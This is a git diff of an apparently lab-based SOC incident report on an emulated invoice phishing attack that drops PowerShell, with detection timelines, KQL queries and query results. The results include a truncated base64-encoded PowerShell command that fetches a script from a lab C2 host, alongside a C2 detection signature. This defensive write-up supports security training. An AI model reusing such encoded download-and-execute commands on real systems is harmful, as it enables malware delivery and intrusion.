@@ -4,21 +4,21 @@
 |-------|-------|
 | **Incident ID** | INC-2026-005 |
 | **Focus Area** | **Phishing & Host Correlation** |
-| **osTicket** | #48340 |
+| **osTicket** | [#48340](../tickets/sample-tickets.md#L110) |
 | **Severity** | P2 — High |
 | **Status** | Closed — True Positive (Lab Emulation) |
-| **Detection Source** | User report + Sentinel PowerShell rule |
+| **Detection Source** | User report + Suricata NIDS + Sentinel PowerShell rule |
 | **Caldera Operation** | `2026-06-17-PHISH-LAB` |
 | **MITRE ATT&CK** | T1566.001, T1204.002, T1059.001, T1071.001 |
 | **Related** | [`phishing/email-header-analysis.md`](../phishing/email-header-analysis.md) · [`artifacts/phishing-invoice.eml`](../artifacts/phishing-invoice.eml) |
 | **Analyst** | Praisel Ekpenyong |
-| **Lab Environment** | Lab 2 — Cloud SOC (Sentinel, Defender, Entra ID) |
+| **Lab Environment** | Lab 2 — Cloud SOC (Sentinel, Defender, Entra ID, Suricata) |
 
 ---
 
 ## Executive Summary
 
-A user-reported invoice phish was correlated with Outlook spawning PowerShell on WKSTN-042. During triage, I mapped out each stage of the attack chain separately—from initial delivery to execution—rather than assuming a full compromise at the outset. The host was isolated immediately post-execution, and follow-up recipient scoping confirmed no credential theft or additional mail clicks, allowing us to safely close the case as contained.
+A user-reported invoice phish was correlated with Outlook spawning PowerShell on WKSTN-042 and a Suricata NIDS alert detecting a suspicious outbound C2 channel. During triage, I mapped out each stage of the attack chain separately—from initial delivery to execution—rather than assuming a full compromise at the outset. The host was isolated immediately post-execution, and follow-up recipient scoping confirmed no credential theft or additional mail clicks, allowing us to safely close the case as contained.
 
 ### MITRE Evidence Map
 
@@ -34,7 +34,12 @@ A user-reported invoice phish was correlated with Outlook spawning PowerShell on
 ## 1. Detection
 
 1. **13:57 UTC** — Employee reported suspicious email (ServiceDesk → SOC)
-2. **14:01 UTC** — Sentinel: PowerShell from `outlook.exe` parent on WKSTN-042
+2. **14:00 UTC** — Suricata NIDS alert on pfSense (syslog-forwarded to Splunk/Sentinel):
+   ```
+   [1:2027758:1] ET CNC Abuse.ch SSL Blacklist Malicious SSL Certificate Detected (Caldera C2 Beacon)
+   Source: 10.10.10.42:49811 -> Destination: 10.10.30.10:8888
+   ```
+3. **14:01 UTC** — Sentinel: PowerShell from `outlook.exe` parent on WKSTN-042
 
 **Subject reported:** `URGENT: Invoice #88421 — password inside email body`  
 **Attachment:** `Invoice_June2026.zip` (password-protected) containing `Invoice.lnk` shortcut.
@@ -74,7 +79,7 @@ A user-reported invoice phish was correlated with Outlook spawning PowerShell on
 | Field | Value |
 |-------|-------|
 | File | `Invoice_June2026.zip` |
-| SHA256 | `9c4e...a1f2` |
+| SHA256 | `b94dce38a9efa578ff4dd41052daef9b1f589d08745e40dc946e19bc144a7789` |
 | Inner file | `Invoice.lnk` → launches `powershell.exe -enc ...` |
 | Static analysis | Shortcut target obfuscated; no legitimate invoice PDF |
 
@@ -97,6 +102,12 @@ DeviceProcessEvents
 | project Timestamp, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
 ```
 
+**Query Results:**
+
+| Timestamp (UTC) | AccountName | FileName | ProcessCommandLine | InitiatingProcessFileName |
+|---|---|---|---|---|
+| 2026-06-17 13:58:12 | jsmith | powershell.exe | `powershell.exe -enc d2dldC1maWxlIC11cmwgaHR0cDovLzEwLjEwLjMwLjEwL3VwZGF0ZS5wczE...` | outlook.exe |
+
 ### Host-to-Network Correlation
 
 I correlated the endpoint process execution with network-level logs to confirm outbound beaconing to the malicious infrastructure:
@@ -110,6 +121,12 @@ DeviceNetworkEvents
 | where RemoteIP == "10.10.30.10" and RemotePort == 8888
 | project Timestamp, InitiatingProcessFileName, InitiatingProcessCommandLine, LocalIP, RemoteIP, RemotePort
 ```
+
+**Query Results:**
+
+| Timestamp (UTC) | InitiatingProcessFileName | InitiatingProcessCommandLine | LocalIP | RemoteIP | RemotePort |
+|---|---|---|---|---|---|
+| 2026-06-17 13:59:02 | powershell.exe | `powershell.exe -enc d2...` | 10.10.10.42 | 10.10.30.10 | 8888 |
 
 This active outbound connection was cross-referenced and verified in the firewall logs and network tap PCAP data at the exact second:
 
@@ -184,6 +201,9 @@ Screenshots are supplemental walkthrough visuals. The sanitized `.eml`, header w
 
 | Artifact | Path |
 |----------|------|
+| Live evidence ledger | [`docs/live-evidence-ledger.md`](../docs/live-evidence-ledger.md) |
+| Caldera operation | `artifacts/caldera-operation-INC005.json` |
 | Sanitized .eml | `artifacts/phishing-invoice.eml` |
 | Header walkthrough | `phishing/email-header-analysis.md` |
+| Parsed triage output | `artifacts/phishing_analysis.md` |
 | Screenshots | `artifacts/screenshots/sentinel-inc005.png`, `defender-inc005.png`, `osticket-48340.png` |
